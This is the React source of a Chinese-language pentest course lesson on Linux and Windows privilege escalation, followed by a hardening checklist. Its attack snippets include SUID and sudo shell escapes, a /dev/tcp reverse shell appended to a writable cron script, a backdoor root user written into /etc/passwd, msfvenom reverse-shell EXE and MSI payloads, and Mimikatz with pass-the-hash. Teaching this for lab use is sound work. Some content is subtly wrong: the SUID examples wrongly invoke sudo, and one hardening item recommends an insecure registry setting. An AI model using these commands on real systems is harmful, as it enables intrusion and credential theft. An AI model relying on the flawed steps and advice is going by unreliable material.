import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './LessonCommon.css';

const LINUX_PRIVESC = [
  { name: 'SUID 提权',       code: `# 查找 SUID 文件（以 root 权限运行）
find / -perm -4000 -type f 2>/dev/null
# 结果示例：/usr/bin/find /usr/bin/vim /usr/bin/nmap

# GTFOBins：利用 SUID find 提权
sudo find . -exec /bin/sh \\; -quit    # → root shell

# 利用 SUID vim
sudo vim -c ':!/bin/sh'               # → root shell

# 利用 /bin/bash SUID（最经典）
ls -la /bin/bash    # -rwsr-xr-x 说明有SUID
/bin/bash -p        # 以 owner(root) 权限运行`, severity: 'critical' },
  { name: 'Sudo 配置错误',   code: `# 查看当前用户 sudo 权限
sudo -l

# 示例输出（高危配置！）
(ALL) NOPASSWD: /usr/bin/python3
# 含义：以任意用户身份无密码运行 python3

# 利用：
sudo python3 -c 'import os; os.system("/bin/bash")'
# → root shell

# 另一个危险配置
(root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!id'           # → uid=0(root)
sudo vim -c ':!/bin/bash'    # → root shell`, severity: 'critical' },
  { name: 'Cron 可写脚本',   code: `# 查看系统计划任务
cat /etc/crontab
ls -la /etc/cron.*

# 发现：root 每分钟执行 /opt/backup.sh
# 检查文件权限
ls -la /opt/backup.sh
# -rwxrwxrwx（所有人可写！！）

# 在脚本中写入反弹 Shell
echo 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1' >> /opt/backup.sh

# 攻击者本机监听
nc -lvnp 4444
# 等待1分钟，cron 执行 → 收到 root shell`, severity: 'high' },
  { name: 'Writable /etc/passwd', code: `# 如果 /etc/passwd 可写（严重配置错误）
ls -la /etc/passwd
# -rw-rw-rw-（所有人可写！）

# 生成无密码的 root 级别用户
openssl passwd -1 -salt abc hacker123
# 输出：$1$abc$xxxxxxxxxxxxxxxxxxxxxxxx

# 写入新用户（uid=0, gid=0 即 root 级别）
echo 'hacker:$1$abc$xxx:0:0::/root:/bin/bash' >> /etc/passwd

# 用新用户登录
su hacker   # 密码：hacker123
id          # → uid=0(root)`, severity: 'critical' },
];

const WINDOWS_PRIVESC = [
  { name: '服务权限配置错误', code: `# 查找可写服务的可执行文件路径
accesschk.exe -uwqs "Authenticated Users" C:\\
# 或
icacls "C:\\Program Files\\VulnService\\app.exe"
# 发现：Authenticated Users 有 (M) 修改权限

# 替换服务可执行文件为恶意 payload
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -f exe -o evil.exe
cp evil.exe "C:\\Program Files\\VulnService\\app.exe"

# 重启服务（服务以 SYSTEM 运行）
sc stop VulnService && sc start VulnService
# 反弹Shell → SYSTEM 权限`, severity: 'critical' },
  { name: '注册表 AlwaysInstallElevated', code: `# 检查注册表（双键都为1才可利用）
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# 生成恶意 MSI（以 SYSTEM 权限安装）
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -f msi -o evil.msi

# 执行
msiexec /quiet /qn /i evil.msi
# → 获得 SYSTEM shell`, severity: 'critical' },
  { name: 'Pass-the-Hash', code: `# 使用 Mimikatz 从内存提取 NTLM Hash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# 结果：Username: Administrator  NTLM: fc525c9683e8fe067095ba2ddc971889

# 使用 Hash 横向移动（不需要明文密码）
# pth-winexe
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 \\\\\\\\192.168.1.105 cmd

# 或用 Metasploit
use exploit/windows/smb/psexec
set SMBPass aad3b435...  # Hash格式
run`, severity: 'critical' },
];

export default function LessonPrivesc() {
  const navigate = useNavigate();
  const [os, setOs] = useState('linux');
  const [activeEntry, setActiveEntry] = useState(0);

  const entries = os === 'linux' ? LINUX_PRIVESC : WINDOWS_PRIVESC;
  const e = entries[activeEntry];

  return (
    <div className="lesson-sec">
      <div className="sec-badge purple">🔑 module_06 — 权限提升</div>
      <div className="sec-disclaimer">⚠️ 以下技术仅用于 HackTheBox / VulnHub / TryHackMe 等合法靶机环境的学习。</div>

      <div className="sec-hero">
        <h1>权限提升与后渗透：Linux / Windows 实战</h1>
        <p>获得初始访问权限只是开始。<strong>提权（Privilege Escalation）</strong>是从普通用户到 root/SYSTEM 的过程，考验对系统配置的深度理解和对细节的敏感度。</p>
      </div>

      {/* OS 切换 */}
      <div className="sec-section">
        <div style={{ display: 'flex', gap: '0.75rem', marginBottom: '1rem' }}>
          <button onClick={() => { setOs('linux'); setActiveEntry(0); }}
            style={{ flex: 1, padding: '0.875rem', borderRadius: '10px', fontWeight: 800, cursor: 'pointer', fontSize: '0.9rem',
              border: `1px solid ${os === 'linux' ? 'rgba(220,38,38,0.5)' : 'rgba(255,255,255,0.07)'}`,
              background: os === 'linux' ? 'rgba(220,38,38,0.1)' : 'rgba(255,255,255,0.02)',
              color: os === 'linux' ? '#f87171' : '#5a1a1a' }}>🐧 Linux 提权</button>
          <button onClick={() => { setOs('windows'); setActiveEntry(0); }}
            style={{ flex: 1, padding: '0.875rem', borderRadius: '10px', fontWeight: 800, cursor: 'pointer', fontSize: '0.9rem',
              border: `1px solid ${os === 'windows' ? 'rgba(56,189,248,0.5)' : 'rgba(255,255,255,0.07)'}`,
              background: os === 'windows' ? 'rgba(56,189,248,0.07)' : 'rgba(255,255,255,0.02)',
              color: os === 'windows' ? '#38bdf8' : '#5a1a1a' }}>🪟 Windows 提权</button>
        </div>

        <h2 className="sec-section-title">⚡ {os === 'linux' ? 'Linux' : 'Windows'} 提权技术（点击切换）</h2>
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.4rem', marginBottom: '0.875rem' }}>
          {entries.map((entry, i) => (
            <button key={i} onClick={() => setActiveEntry(i)}
              style={{ padding: '0.5rem 0.875rem', borderRadius: '8px', fontWeight: 600, fontSize: '0.8rem', cursor: 'pointer', transition: 'all 0.15s',
                border: `1px solid ${activeEntry === i ? 'rgba(220,38,38,0.5)' : 'rgba(255,255,255,0.07)'}`,
                background: activeEntry === i ? 'rgba(220,38,38,0.1)' : 'rgba(255,255,255,0.02)',
                color: activeEntry === i ? '#f87171' : '#5a1a1a' }}>
              {entry.name}
            </button>
          ))}
        </div>

        <div className="sec-terminal">
          <div className="sec-terminal-header">
            <div className="sec-terminal-dot" style={{ background: '#ef4444' }} />
            <div className="sec-terminal-dot" style={{ background: '#f59e0b' }} />
            <div className="sec-terminal-dot" style={{ background: '#22c55e' }} />
            <span style={{ marginLeft: '0.5rem', color: '#f87171' }}>
              {os === 'linux' ? '🐧' : '🪟'} {e.name}
            </span>
            <span className="sec-sev critical" style={{ marginLeft: 'auto', fontSize: '0.65rem' }}>{e.severity}</span>
          </div>
          <div className="sec-terminal-body" style={{ fontSize: '0.75rem' }}>{e.code}</div>
        </div>
      </div>

      {/* 防御建议 */}
      <div className="sec-section">
        <h2 className="sec-section-title">🛡 系统加固：提权漏洞防御清单</h2>
        <div className="sec-grid-2">
          <div className="sec-card" style={{ borderColor: 'rgba(34,197,94,0.2)' }}>
            <h3 style={{ color: '#22c55e' }}>🐧 Linux 加固</h3>
            {['定期 sudo -l 审计，最小化 sudo 权限', '消除不必要的 SUID/SGID 文件', '所有 cron 脚本只允许 root 写入', '/etc/passwd 和 /etc/shadow 权限 644/640', '使用 auditd 监控特权操作', '定期运行 Lynis 安全审计工具'].map(i => (
              <div key={i} style={{ fontSize: '0.78rem', color: '#5a1a1a', marginBottom: '0.2rem' }}>✅ {i}</div>
            ))}
          </div>
          <div className="sec-card" style={{ borderColor: 'rgba(56,189,248,0.2)' }}>
            <h3 style={{ color: '#38bdf8' }}>🪟 Windows 加固</h3>
            {['启用 Windows Credential Guard（防 PtH）', 'LocalAccountTokenFilterPolicy 设为 1', 'UAC 开启最高级别', 'LSA 保护防止内存 dump', '禁用 NTLM v1，强制 Kerberos', 'Windows Defender Credential Guard'].map(i => (
              <div key={i} style={{ fontSize: '0.78rem', color: '#5a1a1a', marginBottom: '0.2rem' }}>✅ {i}</div>
            ))}
          </div>
        </div>
      </div>

      <div className="sec-nav">
        <button className="sec-btn" onClick={() => navigate('/course/security-pentest/lesson/recon')}>← 上一模块</button>
        <button className="sec-btn attack" onClick={() => navigate('/course/security-pentest/lesson/crypto')}>下一模块：密码学 →</button>
      </div>
    </div>
  );
}
